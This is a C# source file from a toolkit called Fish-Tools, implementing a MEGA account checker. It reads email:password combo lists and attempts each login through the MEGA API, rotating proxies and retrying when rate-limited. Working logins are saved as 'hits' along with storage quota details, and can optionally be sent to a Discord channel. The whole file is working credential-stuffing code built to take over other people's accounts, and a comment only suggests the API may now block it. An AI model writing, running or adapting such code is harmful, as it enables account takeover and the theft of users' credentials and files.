/*
------------------------------------------------------------
Made By notfishvr
github: https://github.com/official-notfishvr/Fish-Tools
------------------------------------------------------------
*/
// not working no more bc i think you have to pay to login using the api
using CG.Web.MegaApiClient;
using Fish_Tools.core.Utils;
using System.Text;

namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
{
    internal class MegaAccountChecker : BaseAccountChecker
    {
        private bool EnableDetailedInfo { get; set; } = true;
        private bool EnableAccountInfo { get; set; } = true;

        public MegaAccountChecker() : base("Mega")
        {
            CooldownTime = 550;
            MaxRetries = 3;
            EnableRetry = true;
        }

        protected override void GetAdditionalSettings(Logger logger)
        {
            base.GetAdditionalSettings(logger);
            logger.Info("Enable detailed account information? (y/n):");
            Console.Write("-> ");
            string detailed = Console.ReadLine()?.ToLower();
            EnableDetailedInfo = detailed == "y" || detailed == "yes";

            logger.Info("Enable account info retrieval? (y/n):");
            Console.Write("-> ");
            string accountInfo = Console.ReadLine()?.ToLower();
            EnableAccountInfo = accountInfo == "y" || accountInfo == "yes";
        }

        protected override async Task ProcessCombo(string combo, Logger logger)
        {
            logger.Info($"Starting to process combo: {combo}");

            var comboParts = ParseCombo(combo);
            if (comboParts == null)
            {
                logger.Error($"Invalid combo format: {combo}");
                SaveError(combo, "Invalid format");
                return;
            }

            string email = comboParts[0];
            string password = comboParts[1];

            if (!IsValidEmail(email))
            {
                logger.Error($"Invalid email format: {email}");
                SaveBad(combo, "Invalid email format");
                return;
            }

            logger.Info($"Parsed combo - Email: {email}, Password: {password}");

            await RetryOperation(async () =>
            {
                await CheckLogin(email, password, logger);
            }, combo, logger);
        }

        private bool IsValidEmail(string email)
        {
            try
            {
                var addr = new System.Net.Mail.MailAddress(email);
                return addr.Address == email;
            }
            catch
            {
                return false;
            }
        }

        private async Task CheckLogin(string email, string password, Logger logger)
        {
            logger.Info($"Attempting to login to MEGA with email: {email}");
            var client = new MegaApiClient();

            // Set proxy if enabled
            string proxy = GetNextProxy();
            if (!string.IsNullOrEmpty(proxy))
            {
                try
                {
                    var webProxy = new System.Net.WebProxy(proxy);
                    System.Net.WebRequest.DefaultWebProxy = webProxy;
                    logger.Info($"Using proxy: {proxy}");
                }
                catch (Exception ex)
                {
                    logger.Warn($"Failed to set proxy: {proxy} | {ex.Message}");
                }
            }
            else
            {
                System.Net.WebRequest.DefaultWebProxy = null;
            }

            try
            {
                logger.Info("Calling MEGA API login...");
                    client.Login(email, password);

                    if (client.IsLoggedIn)
                {
                    logger.Info("MEGA login successful!");
                    string hitInfo = $"{email}:{password}";
                    string detailedInfo = hitInfo;

                    if (EnableAccountInfo)
                    {
                        try
                        {
                            logger.Info("Getting account information...");
                        var accountInfo = client.GetAccountInformation();
                        string usedSpace = (accountInfo.UsedQuota / 1073741824L).ToString();
                        string totalSpace = (accountInfo.TotalQuota / 1073741824L).ToString();
                            string usedPercentage = ((double)accountInfo.UsedQuota / accountInfo.TotalQuota * 100).ToString("F1");

                            detailedInfo = $"{email}:{password} | Used Space: {usedSpace}GB | Total Space: {totalSpace}GB | Usage: {usedPercentage}%";

                            if (EnableDetailedInfo)
                            {
                                detailedInfo += $" | Account Type: {accountInfo.GetType().Name}";
                            }

                            logger.Info($"Account info retrieved: {detailedInfo}");
                        }
                        catch (Exception ex)
                        {
                            logger.Warn($"Failed to get account info for {email}: {ex.Message}");
                        }
                    }

                    if (UsingDiscord)
                    {
                        try
                        {
                            logger.Info("Sending Discord notification...");
                            await SendDiscordNotification(detailedInfo);
                            logger.Info("Discord notification sent successfully");
                        }
                        catch (Exception ex)
                        {
                            logger.Warn($"Failed to send Discord notification: {ex.Message}");
                        }
                    }

                    logger.Success($"[HIT] {detailedInfo}");
                    SaveHit(hitInfo, detailedInfo);
                }
                else
                {
                    logger.Error($"[BAD] {email}:{password}");
                    SaveBad($"{email}:{password}", "Login failed");
                }
                }
                catch (Exception ex)
            {
                string errorMessage = ex.Message;
                string errorType = ex.GetType().Name;

                if (errorMessage.Contains("BadArguments"))
                {
                    logger.Error($"[BAD] {email}:{password} | Invalid credentials or email format");
                    SaveBad($"{email}:{password}", "Invalid credentials");
                }
                else if (errorMessage.Contains("ResourceNotExists"))
                {
                    logger.Error($"[BAD] {email}:{password} | Account does not exist");
                    SaveBad($"{email}:{password}", "Account not found");
                }
                else if (errorMessage.Contains("TooManyRequests"))
                {
                    logger.Warn($"[RATE_LIMITED] {email}:{password} | Rate limited");
                    SaveError($"{email}:{password}", "Rate limited");
                    throw;
                }
                else if (errorMessage.Contains("NetworkError") || errorMessage.Contains("Timeout"))
                {
                    logger.Error($"[ERROR] {email}:{password} | Network error: {errorMessage}");
                    SaveError($"{email}:{password}", errorMessage);
                    throw;
                    }
                    else
                    {
                    logger.Error($"[ERROR] {email}:{password} | {errorMessage}");
                    logger.Error($"Exception type: {errorType}");
                    SaveError($"{email}:{password}", errorMessage);
                    throw;
                }
                }
                finally
                {
                    if (client.IsLoggedIn)
                {
                    try
                    {
                        client.Logout();
                    }
                    catch
                    {
                    }
                }
            }
        }

        protected override bool ShouldRetry(Exception ex)
        {
            return ex.Message.Contains("ResourceNotExists") ||
                   ex.Message.Contains("NetworkError") ||
                   ex.Message.Contains("Timeout") ||
                   ex.Message.Contains("ServiceUnavailable") ||
                   ex.Message.Contains("TooManyRequests");
        }

        protected override void UpdateProgress(Logger logger)
        {
            if (ProcessedCombos % 5 == 0 || ProcessedCombos == TotalCombos)
            {
                var elapsed = DateTime.Now - StartTime;
                var rate = ProcessedCombos > 0 ? elapsed.TotalSeconds / ProcessedCombos : 0;
                var remaining = (TotalCombos - ProcessedCombos) * rate;
                var successRate = TotalCombos > 0 ? (double)Hits / TotalCombos * 100 : 0;

                Console.Title = $"Fish Tools | MEGA | Progress: {ProcessedCombos}/{TotalCombos} | Hits: {Hits} | Success: {successRate:F1}% | ETA: {TimeSpan.FromSeconds(remaining):mm\\:ss}";

                logger.Info($"MEGA Progress: {ProcessedCombos}/{TotalCombos} | Hits: {Hits} | Bads: {Bads} | Errors: {Errors} | Success: {successRate:F1}% | Rate: {rate:F2}s/combo");
            }
        }

        protected override void ShowFinalResults(Logger logger)
        {
            var elapsed = DateTime.Now - StartTime;

            Console.WriteLine();
            logger.Success("=== MEGA ACCOUNT CHECKING COMPLETED ===");
            logger.Info($"Total combos: {TotalCombos}");
            logger.Info($"Hits: {Hits}");
            logger.Info($"Bads: {Bads}");
            logger.Info($"Errors: {Errors}");
            logger.Info($"Success rate: {(double)Hits / TotalCombos * 100:F2}%");
            logger.Info($"Total time: {elapsed:hh\\:mm\\:ss}");
            logger.Info($"Average rate: {elapsed.TotalSeconds / TotalCombos:F2}s/combo");
            logger.Info($"Hits saved to: {HitsFile}");
            logger.Info($"Detailed hits saved to: {HitsFileDetailed}");

            if (UsingDiscord)
                logger.Info("Discord notifications were sent");
        }
    }
}